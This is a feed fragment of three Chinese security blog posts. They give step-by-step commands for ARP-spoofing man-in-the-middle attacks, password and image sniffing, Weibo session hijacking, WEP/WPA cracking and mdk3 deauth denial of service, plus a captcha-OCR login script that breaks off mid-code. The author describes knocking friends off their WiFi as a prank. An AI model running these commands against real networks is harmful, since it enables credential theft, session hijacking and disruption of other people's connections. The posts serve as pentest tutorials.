<p>平常我们上网都是处在了内网中，然后经过了nat设备上外网。在内网中我们能干很多有趣的事，嗅探,中间人攻击，种木马等等。</p>
<a id="more"></a>
<h2 id="0x01_使自己成为中间人">0x01 使自己成为中间人</h2><h3 id="mitmf_的ARP攻击">mitmf 的ARP攻击</h3><p><a href="https://github.com/byt3bl33d3r/MITMf/" target="_blank" rel="external">mitmf</a>是一个中间人攻击框架，集成了很多的模块,如下面的ARP欺骗模块，命令使用也很简单。</p>
<p>在kali下安装方法：<br><code>apt-get install mitmf</code></p>
<p>使用mitmf进行ARP欺骗<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmf -i eth0 --spoof --arp --target <span class="number">192.168</span>.<span class="number">254.130</span> --gateway <span class="number">192.168</span>.<span class="number">254.2</span></span><br></pre></td></tr></table></figure></p>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/mitmf_arp.PNG" alt=""></p>
<h3 id="ettercap_的ARP攻击">ettercap 的ARP攻击</h3><p><a href="http://ettercap.github.io/ettercap/" target="_blank" rel="external">Ettercap</a>是一套完整的中间人攻击套件，可以用来执行嗅探、主机分析等。</p>
<blockquote>
<p>Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.</p>
</blockquote>
<p>在这里，我们使用它进行ARP欺骗。ettercap有些不错的插件，可以增强中间人攻击。Ettercap中最重要的插件如下:</p>
<p>dns_spoof (执行DNS欺骗攻击)<br>Dos_attack(对受害主机进行拒绝服务攻击)<br>Chk_poison(检测是否成功进行了攻击)<br>Repoison_arp(顾名思义，修复ARP)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -T -q -M ARP /<span class="number">192.168</span>.<span class="number">254.130</span>/ //</span><br></pre></td></tr></table></figure>
<p><code>-T</code> 使用文字形式的GUI用户界面<br><code>-q</code> 安静模式(不回显)<br><code>-M &lt;METHOD:ARGS&gt;</code> 实施mitm攻击<br><code>-t &lt;proto&gt;</code> 只对这种协议监听</p>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/ettercap_arp.png" alt=""><br>进入交互模式</p>
<h2 id="0x02_查看流量中的信息">0x02 查看流量中的信息</h2><p>成为中间人之后，受害者的流量就经过了你的机子，你就可以查看流量中的信息了。<br>这里用到<a href="http://www.monkey.org/~dugsong/dsniff/" target="_blank" rel="external">dsniff套件</a>，套件中包括：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">dsniff</span></span><br><span class="line">filesnarf</span><br><span class="line">mailsnarf</span><br><span class="line">msgsnarf</span><br><span class="line">urlsnarf</span><br><span class="line">webspy</span><br><span class="line">arpspoof</span><br><span class="line">dnsspoof</span><br><span class="line">macof</span><br><span class="line">sshmitm</span><br><span class="line">webmitm</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>dsniff is a collection of tools for network auditing and penetration testing. dsniff, filesnarf, mailsnarf, msgsnarf, urlsnarf, and webspy passively monitor a network for interesting data (passwords, e-mail, files, etc.). arpspoof, dnsspoof, and macof facilitate the interception of network traffic normally unavailable to an attacker (e.g, due to layer-2 switching). sshmitm and webmitm implement active monkey-in-the-middle attacks against redirected SSH and HTTPS sessions by exploiting weak bindings in ad-hoc PKI.</p>
</blockquote>
<p>###提取图片</p>
<p><code>工具</code> ：driftnet</p>
<ul>
<li>从eth0中走过的流量中提取所有图片到某一个目录下</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0 <span class="operator">-a</span> <span class="operator">-d</span> /tmp/dfritnet/</span><br></pre></td></tr></table></figure>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/driftnet.png" alt=""></p>
<ul>
<li>从文件中提取图片</li>
</ul>
<p>当你用嗅探的方法，拿到了<code>.pcap</code>文件，也可以用<code>driftnet</code>轻易地提取出图片<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet <span class="operator">-f</span> file.pcap <span class="operator">-a</span> <span class="operator">-d</span> /tmp/pics/</span><br></pre></td></tr></table></figure></p>
<h3 id="提取mpeg格式的音频">提取mpeg格式的音频</h3><p>从eth0网卡中嗅探mpeg的音频并保存到/tmp/mpeg/<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0 <span class="operator">-s</span> <span class="operator">-d</span> /tmp/mpeg/</span><br></pre></td></tr></table></figure></p>
<h3 id="提取IRC聊天信息">提取IRC聊天信息</h3><p>工具：msgsnarf</p>
<p>国内普通用户用IRC聊天的好像不多，所以这里一笔带过，但是用法更前面的是一样的。</p>
<h3 id="提取密码">提取密码</h3><p>用dsniff来捕获已知协议获取密码</p>
<blockquote>
<p>dsniff is a password sniffer which handles  FTP,  Telnet,  SMTP,  HTTP,<br>POP,  poppass, NNTP, IMAP, SNMP, LDAP, Rlogin, RIP, OSPF, PPTP MS-CHAP,<br>NFS, VRRP, YP/NIS, SOCKS, X11, CVS, IRC, AIM, ICQ, Napster, PostgreSQL,<br>Meeting  Maker, Citrix ICA, Symantec pcAnywhere, NAI Sniffer, Microsoft<br>SMB, Oracle SQL*Net, Sybase and Microsoft SQL protocols.</p>
</blockquote>
<ul>
<li><p>从eth0网卡中嗅探密码</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsniff -i eth0</span><br></pre></td></tr></table></figure>
</li>
<li><p>从.pcap文件中获取密码</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsniff -p file.pcap</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>##0x03 会话劫持</p>
<p>会话劫持简单一点说就是别人利用了你的会话，然后可以做一些自由你的权限才能做的事。像下面将要讲到的劫持weibo，就是利用受害者登陆了weibo，然后攻击者劫持你的weibo会话，实现在攻击者的机器上也能登陆你的weibo，而不需要你的密码。</p>
<h3 id="ferret和hamster实现"><code>ferret</code>和<code>hamster</code>实现</h3><p>一般能搜索到的会话劫持的工具是利用了<code>ferret</code>和<code>hamster</code>来实现，其中</p>
<ul>
<li>ferret用来在80端口监听提取会话cookies</li>
<li>hamster是一个代理用来操作ferret抓到的数据</li>
</ul>
<p>这里不用这种方法，有兴趣可以自行搜索。</p>
<h3 id="mitmf的会话劫持">mitmf的会话劫持</h3><p>工具：mitmf和mallory</p>
<p>mallory是一个利用session的chrome插件<a href="https://chrome.google.com/extensions/detail/bgidijmlkgjncoaphfdaolejofbblhgl" target="_blank" rel="external">安装点我</a></p>
<p>使用方法：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmf -i eth0 --spoof --arp --target <span class="number">192.168</span>.<span class="number">254.130</span> --gateway <span class="number">192.168</span>.<span class="number">254.2</span> --hijack --mallory</span><br></pre></td></tr></table></figure></p>
<p>成功实现weibo会话劫持：<br><img src="http://7xi3ed.com1.z0.glb.clouddn.com/hijack_weibo.PNG" alt="hijack_weibo"></p>
<h2 id="0x04_HTTP文件下载替换">0x04 HTTP文件下载替换</h2><p>上面讲的都是数据流层面的，嗅探与劫持等，除了这些我们还能渗透主机，像替换下载文件，种入后门。或用重型武器<code>Metasploit</code>直接对安全性弱的主机进行攻击。</p>
<h2 id="0x05_一些中间人攻击的工具">0x05 一些中间人攻击的工具</h2><ol>
<li><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="external"><code>mitmf</code></a>,一个现成的中间人攻击框架，集成了很多的模块包括sslstrip</li>
<li><a href="https://mitmproxy.org/" target="_blank" rel="external"><code>mitmproxy</code></a>和<code>libmproxy</code> ,证书的替换（ssl中）,操作比sslsplit要方便</li>
<li><a href="https://github.com/droe/sslsplit" target="_blank" rel="external"><code>sslsplit</code></a>,证书的替换</li>
<li><a href="https://github.com/moxie0/sslstrip" target="_blank" rel="external"><code>sslstrip</code></a>,将https替换为http</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>##0x00 处在内网中我们能干的事</p>
<p>平常我们上网都是处在了内网中，然后经过了nat设备上外网。在内网中我们能干很多有趣的事，嗅探,中间人攻击，种木马等等。</p>]]>
    
    </summary>
    
      <category term="mitm" scheme="http://xkon.githb.io/tags/mitm/"/>
    
      <category term="sniff" scheme="http://xkon.githb.io/tags/sniff/"/>
    
      <category term="内网" scheme="http://xkon.githb.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[攻击无线WiFi]]></title>
    <link href="http://xkon.githb.io/2015/04/15/%E6%94%BB%E5%87%BB%E6%97%A0%E7%BA%BFWiFi/"/>
    <id>http://xkon.githb.io/2015/04/15/攻击无线WiFi/</id>
    <published>2015-04-15T09:34:53.000Z</published>
    <updated>2015-10-14T03:53:01.000Z</updated>
    <content type="html"><![CDATA[<p>##0x00 前戏</p>
<p>写这篇WiFi攻击的起因其实是自己要做一个小恶作剧。小伙伴们在大中午用无线局域网玩联机游戏，而我又觉得太吵想睡觉，跟他们说又觉得不好意思，所以就用mdk3帮我解决了一下这个小麻烦。然后我又想结合以前所学，整理出了这篇文章。*_^</p>
<p>##0x01 WiFi受攻击面</p>
<p>错误的配置和弱加密,导致了密码被暴力破解的可能，也给了实施DoS攻击的可能。还有邪恶的WiFi钓鱼，网银密码窃取，mitm中间人攻击等等。下面将简单讲解一些攻击方法，包括密码破解，DOS攻击。其中中间人攻击将在其他文章中讲到。WiFi钓鱼不会细讲。</p>
<a id="more"></a>
<p>##0x02 WiFi密码破解</p>
<h3 id="WEP加密的WiFi">WEP加密的WiFi</h3><p>WEP（Wired Equivalent Privacy）加密方式现在基本绝迹了，因为这种加密方式存在缺陷，使得黑客可以在几分钟甚至几秒钟内攻破它。这里只是简单记录一下步骤，不会详细展开。</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. airmon-ng start wlan0                         <span class="comment">//开启wlan0网卡的监听模式</span></span><br><span class="line">2. airodump-ng mon0                              <span class="comment">//查看无线网络的情况，选择</span></span><br><span class="line">3. airodump-ng --ivs -w wep_test -c 6 mon0       <span class="comment">//捕获信道6的ivs数据报文，并保存到wep_test文件中</span></span><br><span class="line">4. aireplay-ng --arpreplay -b &lt;<span class="keyword">AP</span>'s bssid&gt; -<span class="keyword">h</span> &lt;客户端的<span class="keyword">mac</span>&gt; mon0</span><br><span class="line">5. aircrack-ng wep_test*                            <span class="comment">//ivs值到2w以上，一般就可以成功破解出来了</span></span><br></pre></td></tr></table></figure>
<h3 id="WPA/WPA2_加密的WiFi">WPA/WPA2 加密的WiFi</h3><p><strong>方法一</strong><br>抓到握手包，然后跑字典得到密码</p>
<p>主要有五个步骤，其中最后一步字典攻击，需要有强大的字典，获取需要一些社工，获取一些特定的信息来构造字典将会更有效。如下：</p>
<ul>
<li>进入监听模式<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/airmon_start.png" alt=""></p>
<ul>
<li>查看当前WiFi空间信息<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng mon0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/ariodump1.png" alt=""><br>这里我们选择ESSID为<code>Hi</code>的WiFi信号作为我们的测试对象，其中所用信道为11</p>
<ul>
<li>获取单个AP单个信道的流量<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng --bssid AP's_bssid -c <span class="number">11</span> --write filename mon0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/airodump2.png" alt=""></p>
<ul>
<li>Deauth 攻击获取握手包<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">5</span> <span class="operator">-a</span> AP<span class="string">'s_mac -c client'</span>s_mac  mon0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/aireplay.PNG" alt=""></p>
<p><code>-0</code>表示进行deauth攻击，<code>5</code>为攻击次数</p>
<ul>
<li>字典破解得到密码<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w word.lst file.cap</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/aircrack.png" alt=""><br>成功得到密码</p>
<p><strong>方法二</strong><br>利用WPS（Wi-Fi Protected Setup）的<a href="http://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf" target="_blank" rel="external">缺陷</a>，抓pin码破解<br>工具：<a href="https://code.google.com/p/reaver-wps/" target="_blank" rel="external">reaver</a></p>
<h3 id="简单易用的wifite">简单易用的<code>wifite</code></h3><p><a href="https://github.com/derv82/wifite" target="_blank" rel="external">wifite</a>是一个自动化的无线破解工具，他让前面的步骤自动化的执行，而不需要你去记一些命令。给它足够的时间，甚至可以破解全部可被搜索到的WiFi接入点密码……</p>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/screenshot_wps.png" alt="网上找的图"></p>
<p>##0x03 对WiFi的拒绝服务攻击</p>
<blockquote>
<p>mdk3能够发起 Beacon Flood、Authentication DoS、Deauthentication/Disassociation Amok 等模式的攻击，另外它还具有针对隐藏 ESSID 的暴力探测模式、802.1X 渗透测试、WIDS 干扰等功能。</p>
</blockquote>
<p>mdk3已经内置在了Kali中，终端中输入mdk3即可查看用法</p>
<blockquote>
<p>MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mdk3 &lt;interface&gt; &lt;test_mode&gt; [test_options]</span><br><span class="line"></span><br><span class="line">TEST MODES:</span><br><span class="line">b   - Beacon Flood <span class="built_in">Mode</span></span><br><span class="line">      Sends beacon frames to show fake APs <span class="built_in">at</span> clients.</span><br><span class="line">      This can sometimes crash network scanners and even drivers!</span><br><span class="line">a   - Authentication DoS <span class="built_in">mode</span></span><br><span class="line">      Sends authentication frames to all APs found <span class="flow">in</span> range.</span><br><span class="line">      Too much clients freeze or reset some APs.</span><br><span class="line">p   - Basic probing and ESSID Bruteforce <span class="built_in">mode</span></span><br><span class="line">      Probes AP and check <span class="flow">for</span> answer, useful <span class="flow">for</span> checking <span class="flow">if</span> SSID has</span><br><span class="line">      been correctly decloaked or <span class="flow">if</span> AP is <span class="flow">in</span> your adaptors sending range</span><br><span class="line">      SSID Bruteforcing is also possible with this test <span class="built_in">mode</span>.</span><br><span class="line">d   - Deauthentication / Disassociation Amok <span class="built_in">Mode</span></span><br><span class="line">      Kicks everybody found from AP</span><br><span class="line">m   - Michael shutdown exploitation (TKIP)</span><br><span class="line">      Cancels all traffic continuously</span><br><span class="line">x   - <span class="number">802</span>.<span class="number">1</span>X tests</span><br><span class="line">w   - WIDS/WIPS Confusion</span><br><span class="line">      Confuse/Abuse Intrusion Detection and Prevention Systems</span><br><span class="line">f   - MAC filter bruteforce <span class="built_in">mode</span></span><br><span class="line">      This test uses a list of known client MAC Adresses and tries to</span><br><span class="line">      authenticate them to the given AP while dynamically changing</span><br><span class="line">      its response timeout <span class="flow">for</span> best performance. It currently works only</span><br><span class="line">      on APs who deny an open authentication request properly</span><br><span class="line">g   - WPA Downgrade test</span><br><span class="line">      deauthenticates Stations and APs sending WPA encrypted packets.</span><br><span class="line">      With this test you can check <span class="flow">if</span> the sysadmin will try setting his</span><br><span class="line">      network to WEP or disable encryption.</span><br></pre></td></tr></table></figure>
<p>关于mdk3的使用网上已经有了太多的教程，而且说得比较详细<br>可以参考<a href="http://files.cnblogs.com/files/noevil/Mdk3.pdf" target="_blank" rel="external">MDK3—无线拒绝服务攻击的开始</a>。<br>这里只说一个小trick，当小伙伴们用无线局域网玩游戏的时候，而你又觉得太吵，跟他们说又不好意思的话，这个mdk3能帮助你解决一些小麻烦，但是不要玩过火哦……</p>
<p>一般<code>Authentication DoS mode</code>会玩过火，<code>Deauthentication</code>可以做的比较好，让他们不时发出一声<code>O，我掉线了</code>，<code>O 我卡了</code>，然后他们玩的不爽了，过一会就会不玩的……</p>
<p>##0x04 WiFi钓鱼</p>
<p>今年的央视“3·15”晚会曝光了黑客在公共场所利用“钓鱼WiFi”窃取用户隐私信息一事，又引起了大众对钓鱼WiFi的关注。</p>
<p>乌云上也有一篇<a href="http://drops.wooyun.org/tips/112" target="_blank" rel="external">公共无线安全——FakeAP之WiFi钓鱼</a></p>
<p>在github上也有人放出了一款WiFi钓鱼软件<a href="https://github.com/sophron/wifiphisher" target="_blank" rel="external">wifiphisher</a>，作者自称这是一款社工工具，原理就是攻击者建立一个假冒的AP，然后用deauth攻击，让客户端离线，接着让客户端连上自己的假冒的AP，最后给一个逼真的路由配置界面，让客户输入密码，从而得到密码。<br><img src="http://7xi3ed.com1.z0.glb.clouddn.com/wifiphish.jpg" alt=""></p>
<p>这么邪恶的WiFi钓鱼，我可没有做过……</p>
<p>##0x05 参考</p>
<ul>
<li><a href="http://www.cse.wustl.edu/~jain/cse571-07/ftp/wireless_hacking/" target="_blank" rel="external">Wireless Hacking Tools</a></li>
</ul>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/Tuscany, Italy.jpg" alt="世界美景"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>##0x00 前戏</p>
<p>写这篇WiFi攻击的起因其实是自己要做一个小恶作剧。小伙伴们在大中午用无线局域网玩联机游戏，而我又觉得太吵想睡觉，跟他们说又觉得不好意思，所以就用mdk3帮我解决了一下这个小麻烦。然后我又想结合以前所学，整理出了这篇文章。*_^</p>
<p>##0x01 WiFi受攻击面</p>
<p>错误的配置和弱加密,导致了密码被暴力破解的可能，也给了实施DoS攻击的可能。还有邪恶的WiFi钓鱼，网银密码窃取，mitm中间人攻击等等。下面将简单讲解一些攻击方法，包括密码破解，DOS攻击。其中中间人攻击将在其他文章中讲到。WiFi钓鱼不会细讲。</p>]]>
    
    </summary>
    
      <category term="wifi" scheme="http://xkon.githb.io/tags/wifi/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[识别简单的验证码]]></title>
    <link href="http://xkon.githb.io/2015/04/06/%E8%AF%86%E5%88%AB%E7%AE%80%E5%8D%95%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    <id>http://xkon.githb.io/2015/04/06/识别简单的验证码/</id>
    <published>2015-04-06T04:35:15.000Z</published>
    <updated>2015-10-14T03:53:01.000Z</updated>
    <content type="html"><![CDATA[<p>##0x00 前戏</p>
<p>第一篇文章记录一下自己写的一个小脚本，关于识别验证码与Python登陆网站并抓取信息。重头戏放在了验证码识别上，所以题目就是识别简单的验证码了。</p>
<p>##0x01 认识验证码</p>
<p>全自动区分计算机和人类的公开图灵测试（英语：Completely Automated Public Turing test to tell Computers and Humans Apart，简称CAPTCHA），俗称验证码，是一种区分用户是计算机和人的公共全自动程序。<a href="http://zh.wikipedia.org/wiki/%E9%AA%8C%E8%AF%81%E7%A0%81" target="_blank" rel="external">来源：维基百科</a>。设计验证码就是为了抵御机器的攻击，但是很多的验证码是形同虚设，像我们学校校园网用的深澜的系统，在查流量登录时的验证码，就很容易被机器识别。<img src="http://7xi3ed.com1.z0.glb.clouddn.com/vcode.png" alt="深澜验证码"><br><a id="more"></a></p>
<p>##0x02 用python识别验证码</p>
<p>网上有很多用Python来做验证码识别的文章，这里我采用了最简单的一个方法，但也会有一定的识别失败的几率。<br>用到两个库<code>PIL</code>和<code>pytesseract</code>。其中<code>pytesseract</code>还依赖于<code>tesseract-ocr</code>,下载链接在这<a href="https://code.google.com/p/tesseract-ocr/downloads/list" target="_blank" rel="external">https://code.google.com/p/tesseract-ocr/downloads/list</a>，最新版是3.02.02，下载exe文件安装即可。好像要梯子……</p>
<p>两个Python库都可以通过<code>pip</code>安装</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> pillow</span><br><span class="line">pip <span class="keyword">install</span> pytesseract</span><br></pre></td></tr></table></figure>
<p>好了，以上工作做好后，一切就就绪了，接下来直接上代码。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> sys,pytesseract</span><br><span class="line"></span><br><span class="line">im=Image.open(sys.argv[<span class="number">1</span>])</span><br><span class="line">vcode=pytesseract.image_to_string(im)</span><br><span class="line"><span class="keyword">print</span> vcode</span><br></pre></td></tr></table></figure>
<p>通过上面的五行代码就可以轻松识别一些简单的验证码，其实真正的代码只有两行，可见<code>pytesseract</code>封装做的很好。效果图</p>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/example.png" alt="测试"></p>
<p>上面是利用了<code>tesseract-ocr</code>的强大的图片字符识别功能，但是识别出错的几率也是比较大的。像下图这样，<code>2613</code>被识别成了<code>26i3</code>，像这样的识别错误，我们可以通过重新获取验证码来提高识别几率，下面将会有一个例子。<br><img src="http://7xi3ed.com1.z0.glb.clouddn.com/failocr.png" alt="识别失败"></p>
<h2 id="0x03_一个小案例">0x03 一个小案例</h2><p>上面说了深澜的验证码形同虚设，那我就拿他开刀，做了一个识别验证码并成功登陆获取流量信息的小脚本。此处只是做了方便自己查询剩余流量的功能，如果别人拿这小片代码去干什么违法的勾当，像暴库，撞库，之类的，完全跟我无关呐。代码新手，大牛勿喷啊，好像也没法喷，还没有开启评论功能呢(⊙o⊙)</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span><br><span class="line">查看自己的校园网流量使用情况,会有一定的几率验证码识别失败...</span><br><span class="line">                by xk0n</span><br><span class="line">'''</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">r'''</span><br><span class="line">        __   _______          </span><br><span class="line">___  __|  | _\   _  \   ____  </span><br><span class="line">\  \/  /  |/ /  /_\  \ /    \ </span><br><span class="line"> &gt;    &lt;|    &lt;\  \_/   \   |  \</span><br><span class="line">/__/\_ \__|_ \\_____  /___|  /</span><br><span class="line">      \/    \/      \/     \/</span><br><span class="line">      '''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://zyzfw.xidian.edu.cn:8800/"</span></span><br><span class="line">vcode_path = <span class="string">"http://zyzfw.xidian.edu.cn:8800/include/function/chekcode.php?43"</span></span><br><span class="line">user = <span class="string">''</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">down_png</span><span class="params">(req, img_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'check.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        img_stream = req.get(img_path, stream=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> img_stream.iter_content(chunk_size=<span class="number">1024</span>):</span><br><span class="line">            <span class="keyword">if</span> chunk:  <span class="comment"># filter out keep-alive new chunks</span></span><br><span class="line">                f.write(chunk)</span><br><span class="line">                f.flush()</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(req, code, user, passwd)</span>:</span></span><br><span class="line">    payload = &#123;<span class="string">'ts'</span>: <span class="string">'login'</span>, <span class="string">'chekcode'</span>: code,</span><br><span class="line">               <span class="string">'username'</span>: user, <span class="string">'password'</span>: passwd&#125;</span><br><span class="line">    r2 = req.post(url + <span class="string">'/index.php?action=login'</span>, data=payload)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] Return code is '</span>+r2.text</span><br><span class="line">    <span class="keyword">if</span> r2.text == <span class="string">'101'</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[*] login success!'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取验证码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_vcode</span><span class="params">(req, vcode_path)</span>:</span></span><br><span class="line">    vcode = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">'\d&#123;4&#125;'</span>, vcode) <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            down_png(req, vcode_path)</span><br><span class="line"></span><br><span class="line">            im = Image.open(<span class="string">'check.png'</span>)</span><br><span class="line">            vcode = pytesseract.image_to_string(im)</span><br><span class="line">            vcode = vcode[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">            vcode_path += <span class="string">'?'</span> + <span class="string">''</span>.join(str(time.time()).split(<span class="string">'.'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[*] verification code is '</span> + vcode</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> vcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印banner</span></span><br><span class="line"><span class="keyword">print</span> banner</span><br><span class="line">req = 